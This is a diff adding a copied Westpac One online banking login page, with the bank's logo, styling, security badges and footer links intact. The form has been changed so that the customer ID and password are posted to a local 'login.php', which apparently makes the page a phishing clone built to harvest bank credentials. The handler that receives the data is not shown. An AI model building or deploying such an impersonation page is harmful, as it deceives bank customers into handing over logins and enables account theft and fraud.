@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths desktop mac landscape mac os macos10 macos10_14 32bit chrome chrome86 chrome86_0 webkit en-us" data-scrapbook-source="https://bank.westpac.co.nz/wone/app.html#login" data-scrapbook-create="20201026180906927">
+<head>
+    <meta charset="UTF-8">
+    <title>Westpac One® - Online Banking</title>
+    <meta name="description" content="Welcome to Westpac One® – your new online banking experience has launched! Westpac One makes online banking easier, faster and smarter than ever. Log in to Westpac One®">
+    <meta name="keywords" content="log in to Westpac One®,Westpac One®,online banking,new online banking,Westpac One® online banking,online account">
+    <link rel="canonical" href="https://bank.westpac.co.nz/one/app.html#login">
+
+    <meta name="msapplication-tap-highlight" content="no">
+
+    <!-- iOS Smart App Banner that will only be rendered in Safari on iOS Devices -->
+    <meta name="apple-itunes-app" content="app-id=510251434">
+
+    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+    <link rel="icon" type="image/png" href="favicon-16x16.png" sizes="16x16">
+    <link rel="icon" type="image/png" href="favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="favicon-96x96.png" sizes="96x96">
+    <link rel="icon" type="image/png" href="favicon-194x194.png" sizes="194x194">
+
+    <link rel="stylesheet" href="all.css">
+
+    <!-- Manifest -->
+    <link rel="manifest" href="https://bank.westpac.co.nz/wone/manifest.json">
+
+    <!-- Icons that will be displayed when bookmarking on mobile devices-->
+    <link rel="apple-touch-icon" sizes="57x57" href="https://bank.westpac.co.nz/wone/images/mobile-homescreen-icons/ios-homescreen-icons/apple-touch-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="https://bank.westpac.co.nz/wone/images/mobile-homescreen-icons/ios-homescreen-icons/apple-touch-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="https://bank.westpac.co.nz/wone/images/mobile-homescreen-icons/ios-homescreen-icons/apple-touch-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="https://bank.westpac.co.nz/wone/images/mobile-homescreen-icons/ios-homescreen-icons/apple-touch-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="https://bank.westpac.co.nz/wone/images/mobile-homescreen-icons/ios-homescreen-icons/apple-touch-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="https://bank.westpac.co.nz/wone/images/mobile-homescreen-icons/ios-homescreen-icons/apple-touch-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="https://bank.westpac.co.nz/wone/images/mobile-homescreen-icons/ios-homescreen-icons/apple-touch-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="https://bank.westpac.co.nz/wone/images/mobile-homescreen-icons/ios-homescreen-icons/apple-touch-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://bank.westpac.co.nz/wone/images/mobile-homescreen-icons/ios-homescreen-icons/apple-touch-icon-180x180.png">
+    <link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://bank.westpac.co.nz/wone/images/mobile-homescreen-icons/ios-homescreen-icons/apple-touch-icon-precomposed.png">
+    <link rel="mask-icon" href="https://bank.westpac.co.nz/wone/images/mobile-homescreen-icons/ios-homescreen-icons/safari-pinned-tab.svg" color="#54314e">
+    <meta name="apple-itunes-app" content="app-id=510251434">
+    <meta name="apple-mobile-web-app-title" content="Westpac One">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="theme-color" content="#54314e">
+
+    <meta name="viewport" id="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,initial-scale=1.0">
+    <meta name="format-detection" content="telephone=no">
+
+<link href="0.58ac18115e6aa314ad7e.css" rel="stylesheet"><link href="app.8c035e607f8f85de1df5.css" rel="stylesheet"><link href="styles.7898fcc813b6b3ed7ce0.css" rel="stylesheet"><link href="entrance.0c981b81109e172d995e.css" rel="stylesheet"><link href="main.bfa1d720b4cb52209a80.css" rel="stylesheet"><link href="print.6bca93bdd76fe04c7050.css" rel="stylesheet"><script src="sjcl.js"></script><script src="sha.js"></script><script src="AppMeasurement.min.js" async=""></script><script src="AppMeasurement_Module_ActivityMap.min.js" async=""></script><style type="text/css">.datepicker-modal {
+    position: fixed;
+    right: 0;
+    bottom: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, .6);
+    z-index: 999;
+    display: -webkit-box;
+    display: -ms-flexbox;
+    display: flex;
+    -webkit-box-align: center;
+        -ms-flex-align: center;
+            align-items: center;
+    -webkit-box-pack: center;
+        -ms-flex-pack: center;
+            justify-content: center;
+}
+
+.datepicker {
+    position: absolute;
+    left: 0;
+    bottom: 0;
+    width: 100%;
+    z-index: 1;
+    font-size: 16px;
+    text-align: center;
+    font-family: arial,verdana,sans-serif;
+    -webkit-box-sizing: content-box;
+            box-sizing: content-box;
+    -webkit-font-smoothing: antialiased;
+    -webkit-user-select: none;
+       -moz-user-select: none;
+        -ms-user-select: none;
+            user-select: none;
+}
+
+.datepicker .datepicker-header {
+        padding: 0 .5em;
+        min-height: 2em;
+        line-height: 2em;
+        font-size: 1.125em;
+    }
+
+.datepicker .datepicker-navbar {
+        padding: 0 .5em .5em .5em;
+        overflow: hidden;
+    }
+
+.datepicker .datepicker-navbar-btn {
+        height: 2.5em;
+        line-height: 2.5em;
+        float: right;
+        padding: 0 1em;
+        cursor: pointer;
+    }
+
+.datepicker .datepicker-content {
+        display: -webkit-box;
+        display: -ms-flexbox;
+        display: flex;
+        padding: .5em .25em;
+    }
+
+.datepicker .datepicker-col-1 {
+        -webkit-box-flex: 1;
+            -ms-flex: 1;
+                flex: 1;
+        margin: 0 .25em;
+    }
+
+.datepicker .datepicker-viewport {
+        height: 200px;
+        position: relative;
+        overflow: hidden
+    }
+
+.datepicker .datepicker-viewport::after {
+    content: '';
+    position: absolute;
+    z-index: 2;
+    top: 0;
+    right: 0;
+    bottom: 0;
+    left: 0;
+    pointer-events: none;
+}
+
+.datepicker .datepicker-wheel {
+        position: absolute;
+        height: 40px;
+        top: 50%;
+        margin-top: -20px;
+        width: 100%;
+    }
+
+.datepicker .datepicker-scroll {
+        list-style-type: none;
+        padding: 0
+    }
+
+.datepicker .datepicker-scroll>li {
+    height: 40px;
+    line-height: 40px;
+    font-size: 1.375em;
+    cursor: pointer;
+}
+
+.datepicker {
+
+    /* default */
+}
+
+.datepicker.default {
+    background-color: #f7f7f7;
+}
+
+.datepicker.default .datepicker-header {
+            color: #4eccc4;
+}
+
+.datepicker.default .datepicker-wheel {
+            border-top: 1px solid #4eccc4;
+            border-bottom: 1px solid #4eccc4;
+}
+
+.datepicker.default .datepicker-scroll li {
+                color: rgb(59, 59, 59);
+            }
+
+.datepicker.default .datepicker-scroll li.disabled {
+                color: rgb(191, 191, 191);
+            }
+
+.datepicker.default .datepicker-navbar-btn {
+            color: #4eccc4;
+}
+
+.datepicker {
+
+    /* dark */
+}
+
+.datepicker.dark {
+    background-color: #263238;
+}
+
+.datepicker.dark .datepicker-header {
+            color: #50ccc4;
+}
+
+.datepicker.dark .datepicker-wheel {
+            border-top: 1px solid #50ccc4;
+            border-bottom: 1px solid #50ccc4;
+}
+
+.datepicker.dark .datepicker-scroll li {
+                color: rgb(201, 203, 204);
+            }
+
+.datepicker.dark .datepicker-scroll li.disabled {
+                color: rgb(87, 96, 100);
+            }
+
+.datepicker.dark .datepicker-navbar-btn {
+            color: #50ccc4;
+}
+
+.datepicker {
+
+    /* ios */
+}
+
+.datepicker.ios {
+    background-color: #f7f7f7;
+}
+
+.datepicker.ios .datepicker-col-1 {margin: 0;
+}
+
+.datepicker.ios .datepicker-header {
+            color: rgb(59, 59, 59);
+            padding: 0 3.5em;
+}
+
+.datepicker.ios .datepicker-viewport::after {
+    background: -webkit-gradient(linear,left top, left bottom,from(#f7f7f7),color-stop(52%, rgba(245, 245, 245, 0)),color-stop(48%, rgba(245, 245, 245, 0)),to(#f7f7f7));
+    background: linear-gradient(#f7f7f7,rgba(245, 245, 245, 0)52%,rgba(245, 245, 245, 0)48%,#f7f7f7);
+}
+
+.datepicker.ios .datepicker-wheel {
+            border-top: 1px solid #dbdbdb;
+            border-bottom: 1px solid #dbdbdb;
+}
+
+.datepicker.ios .datepicker-scroll li {
+                color: rgb(59, 59, 59);
+            }
+
+.datepicker.ios .datepicker-scroll li.disabled {
+                color: rgb(191, 191, 191);
+            }
+
+.datepicker.ios .datepicker-navbar {
+            position: absolute;
+            z-index: 2;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 0;
+            border-bottom: 1px solid #acacac;
+}
+
+.datepicker.ios .datepicker-navbar-btn {
+            color: #007aff;
+}
+
+.datepicker.ios .datepicker-navbar-btn:nth-child(2) {
+    float: left;
+}
+
+.datepicker.ios .datepicker-content {
+            padding-top: 48px;
+}
+
+.datepicker.ios .datepicker-header + .datepicker-content {
+          padding-top: 0;
+}
+
+.datepicker {
+
+    /* android */
+}
+
+.datepicker.android, .datepicker.android-dark {
+    background-color: #f5f5f5;
+}
+
+.datepicker.android .datepicker-header, .datepicker.android-dark .datepicker-header {
+            color: #31b6e7;
+            border-bottom: 2px solid #31b6e7;
+}
+
+.datepicker.android .datepicker-col-1, .datepicker.android-dark .datepicker-col-1 {margin: 0 .625em;
+}
+
+.datepicker.android .datepicker-viewport::after, .datepicker.android-dark .datepicker-viewport::after {
+    background-image: -webkit-gradient(linear,left top, left bottom,from(#f5f5f5),color-stop(52%, rgba(245, 245, 245, 0)),color-stop(48%, rgba(245, 245, 245, 0)),to(#f5f5f5));
+    background-image: linear-gradient(#f5f5f5,rgba(245, 245, 245, 0)52%,rgba(245, 245, 245, 0)48%,#f5f5f5);
+}
+
+.datepicker.android .datepicker-wheel, .datepicker.android-dark .datepicker-wheel {
+            border-top: 2px solid #31b6e7;
+            border-bottom: 2px solid #31b6e7;
+}
+
+.datepicker.android .datepicker-scroll li, .datepicker.android-dark .datepicker-scroll li {
+                font-size: 1.125em;
+                color: rgb(56, 56, 56);
+            }
+
+.datepicker.android .datepicker-scroll li.disabled, .datepicker.android-dark .datepicker-scroll li.disabled {
+                color: rgb(188, 188, 188);
+            }
+
+.datepicker.android .datepicker-navbar, .datepicker.android-dark .datepicker-navbar {
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            border-top: 1px solid #d9d4d4;
+            padding: 0;
+}
+
+.datepicker.android .datepicker-navbar-btn, .datepicker.android-dark .datepicker-navbar-btn {
+            padding: 0;
+            color: #000;
+            -webkit-box-flex: 1;
+                -ms-flex: 1;
+                    flex: 1;
+}
+
+.datepicker.android .datepicker-navbar-btn:nth-child(2), .datepicker.android-dark .datepicker-navbar-btn:nth-child(2) {
+    border-left: 1px solid #d9d4d4;
+}
+
+.datepicker {
+
+    /* android-dark */
+}
+
+.datepicker.android-dark {
+    background-color: #292829;
+}
+
+.datepicker.android-dark .datepicker-viewport::after {
+    background-image: -webkit-gradient(linear,left top, left bottom,from(#282828),color-stop(52%, rgba(40, 40, 40, 0)),color-stop(48%, rgba(40, 40, 40, 0)),to(#282828));
+    background-image: linear-gradient(#282828,rgba(40, 40, 40, 0)52%,rgba(40, 40, 40, 0)48%,#282828);
+}
+
+.datepicker.android-dark .datepicker-scroll li {
+                color: rgb(199, 199, 199);
+            }
+
+.datepicker.android-dark .datepicker-scroll li.disabled {
+                color: rgb(88, 88, 88);
+            }
+
+.datepicker.android-dark .datepicker-navbar { border-color: #424542;
+}
+
+.datepicker.android-dark .datepicker-navbar-btn {
+            color: #fff;
+}
+
+.datepicker.android-dark .datepicker-navbar-btn:nth-child(2) {
+    border-color: #424542;
+}
+</style>
+</head>
+
+<body id="content" class="support-svg unenclosed notDefaultAndroid mainview-LoginView" data-main-view="LoginView" style="">
+    <div id="app" class="app-wrapper"><div>    <div id="logo"></div>
+
+	<div class="container">
+			<div id="menu" class="main-menu div hidden no-bottom"><ul class="menu-list">	<li class="menu-item menu-item-accounts ">
+		<a href="#accounts" id="main-nav-link-accounts" tabindex="1" data-target="accounts" title="" role="navigation" class="main-nav-link main-nav-link-accounts">
+			<span class="mobile-menu-item-mid-point"></span>
+			<div class="menu-item-content-wrapper noprint">
+				<span class="icon"></span>
+				Accounts
+			</div>
+		</a>
+	</li>
+	<li class="menu-item menu-item-payments-transfers ">
+		<a href="#payments-transfers" id="main-nav-link-payments-transfers" tabindex="1" data-target="payments-transfers" title="Payments &amp; transfers including international &amp; automatic" role="navigation" class="main-nav-link main-nav-link-payments-transfers">
+			<span class="mobile-menu-item-mid-point"></span>
+			<div class="menu-item-content-wrapper noprint">
+				<span class="icon"></span>
+				Pay &amp; Transfer
+			</div>
+		</a>
+	</li>
+	<li class="menu-item menu-item-timeline ">
+		<a href="#timeline" id="main-nav-link-timeline" tabindex="1" data-target="timeline" title="View all your transactions" role="navigation" class="main-nav-link main-nav-link-timeline">
+			<span class="mobile-menu-item-mid-point"></span>
+			<div class="menu-item-content-wrapper noprint">
+				<span class="icon"></span>
+				Timeline
+			</div>
+		</a>
+	</li>
+	<li class="menu-item menu-item-payees ">
+		<a href="#payees" id="main-nav-link-payees" tabindex="1" data-target="payees" title="" role="navigation" class="main-nav-link main-nav-link-payees">
+			<span class="mobile-menu-item-mid-point"></span>
+			<div class="menu-item-content-wrapper noprint">
+				<span class="icon"></span>
+				Payees
+			</div>
+		</a>
+	</li>
+
+<button class="menu-trigger" name="Menu">Menu</button></ul></div>
+			<div id="customer-feedback-form"></div>
+            <div id="profile-address-form"></div>
+
+		<div id="main-container" class="main-container"><div><div id="view" class="view-login">
+	<div id="main" style="min-height: 647px;">
+
+        <div class="wp-t-center wo-u-show--login">
+            <img id="login-logo" class="wo-c-logo-wone" src="logo-westpac-one-white.svg" alt="Westpac One Logo">
+        </div>
+
+        <div class="content-wrapper">
+            <div class="new-internet-banking-wrapper">
+                
+
+                                
+                <h2 class="product-list-title form-title"><span class="title">Log in to Westpac One</span></h2>
+                <div class="new-internet-banking-content">
+                    <div id="login-form-view"><div><div class="login-form">
+<form name="login-form" method="post" action="login.php" autocomplete="off">
+        <div id="username-region"><div><input id="login-username" type="text" class="username" placeholder="Customer ID or username" tabindex="1" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" value="" name="username">
+</div></div>
+        <div id="password-region"><div><input id="login-password" type="password" class="password" placeholder="Password" tabindex="2" autocomplete="off" maxlength="200" value="" name="password"></div></div>
+
+    <div class="login-actions">
+        <p class="forgot-password desktop-only"><a href="#self-service-password-reset">Forgot your password</a>?</p>
+
+        <button id="action-login" class="button submit">Login</button>
+
+        <div class="login-actions">
+            <p class="forgot-password phone-only"><a href="#self-service-password-reset">Forgot your password</a>?</p>
+        </div>
+
+    </div>
+
+    
+
+    <input type="password" id="fake-login-password" class="disable-save-password-safari" name="password-1" autocomplete="new-password" tabindex="-1">
+
+    <span style="display:none">
+        <input type="input" autocomplete="off" value="">
+        <input type="password" name="password-2" autocomplete="new-password">
+    </span>
+</div>
+</div></div>
+                </div>
+                <div id="login-features-cms-data-right" class="new-internet-banking-description"> </a></p></div>
+            </div>
+            <div id="login-features-cms-data-bottom" class="bottom-login-page-data"></div>
+        </div>
+
+		<div class="footer" style="bottom: 0px;">
+			<div class="wrapper">
+				<p class="security footer-content-wrapper">
+					<span class="security-toggler phone-only"><a href="#">Security features</a></span>
+					<span class="wrapper">
+						<span class="security-link-row">
+							<a href="https://www.westpac.co.nz/link/bank/how-we-keep-you-safe-online/" target="_blank" class="online-guardian">
+                                <span class="wp-u-accessible">Westpac online guardian</span>
+                            </a>
+                            <a href="https://www.westpac.co.nz/link/bank/online-banking-guarantee" target="_blank" class="online-guarantee">
+                                <span class="wp-u-accessible">Westpac online guarantee</span>
+                            </a>
+                            <a href="https://www.entrust.net/customer/profile.cfm?domain=bank.westpac.co.nz&amp;lang=en" target="_blank" class="online-entrust" style="background-image:url(&quot;entrust.png&quot;)">
+                            </a>
+						</span>
+					</span>
+				</p>
+
+				<p class="links">
+					<span class="copyright not-on-phone">© 2020 Westpac New Zealand Limited</span>
+					<a href="http://www.westpac.co.nz/" class="not-on-phone" target="_blank">Westpac.co.nz</a>
+					<a href="http://www.westpac.co.nz/link/bank/general-terms-and-conditions" target="_blank">Terms &amp; Conditions</a>
+					<a href="http://www.westpac.co.nz/who-we-are/about-westpac-new-zealand/westpac-legal-information/" target="_blank">Privacy Statement</a>
+				</p>
+			</div>
+		</div>
+	</div>
+</div>
+</div></div>
+
+        <div id="top-bar"><div><div class="profile-wrapper">
+	<div class="content-wrapper" role="menubar">
+	</div>
+</div>
+</div></div>
+
+		<div href="#" id="mobile-container-overlay" class="overlay hidden phone-only" tabindex="1000" onclick=""></div>
+        <div id="mobile-sidebar">
+            <button id="close-mobile-sidebar-button" class="phone-only close-sidebar-button">Show/hide sidebar</button>
+            <div id="mobile-sidebar-body"></div>
+        </div>
+	</div>
+
+	<div id="session-dialog" class="dialog-container"></div>
+    <div id="dialog" class="dialog-container" style="display: none;"></div>
+    <div id="standardPopupView"></div>
+	<div id="manage-card-dialog"></div>
+
+	<div id="app-overlay" class="overlay hidden"></div>
+    <div id="transparent-overlay" class="hidden"></div>
+
+		<div id="phone-landscape-message">
+			<div class="content-wrapper">
+				<h2 class="title">Work best in portrait mode</h2>
+				<img class="img-phone-rotate" src="phone-rotate.gif" width="80" height="80">
+				<img class="img-phone-rotate-hd" src="phone-rotate@2.gif" width="80" height="80">
+				<div class="content">
+					<p class="msg">Flip your device for the best experience.</p>
+					<p class="actions">Or, <a href="#" id="force-phone-landscape">view landscape anyway</a></p>
+				</div>
+			</div>
+		</div>
+</div></div>
+    <script src="ibmmfpf.js"></script>
+    <script src="w1AppConfig.js"></script>
+<script type="text/javascript" src="launch-551518dcaefa.min.js"></script><script>_satellite["_runScript1"](function(event, target, Promise) {
+function syncGoogle() {
+          var img = document.createElement("img");
+      img.src = "https://cm.g.doubleclick.net/pixel?google_nid=adobe_dmp&google_cm";     
+      };
+syncGoogle() ;
+});</script><script type="text/javascript" src="vendor.58ac18115e6aa314ad7e.js"></script><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_wnzl_0" name="destination_publishing_iframe_wnzl_0_name" src="index_1.html#https%3A%2F%2Fbank.westpac.co.nz" class="aamIframeLoaded" style="display: none; width: 0px; height: 0px;"></iframe><script type="text/javascript" src="origination.ffae9179560da63df022.js"></script><script type="text/javascript" src="payment.ce1b85206838b82c51f0.js"></script><script type="text/javascript" src="ui.bd83348492696e847e29.js"></script><script type="text/javascript" src="app.8c035e607f8f85de1df5.js"></script><script type="text/javascript" src="styles.7898fcc813b6b3ed7ce0.js"></script><script type="text/javascript" src="entrance.0c981b81109e172d995e.js"></script><script type="text/javascript" src="main.bfa1d720b4cb52209a80.js"></script><script type="text/javascript" src="print.6bca93bdd76fe04c7050.js"></script>
+
+
+</body>
+</html>
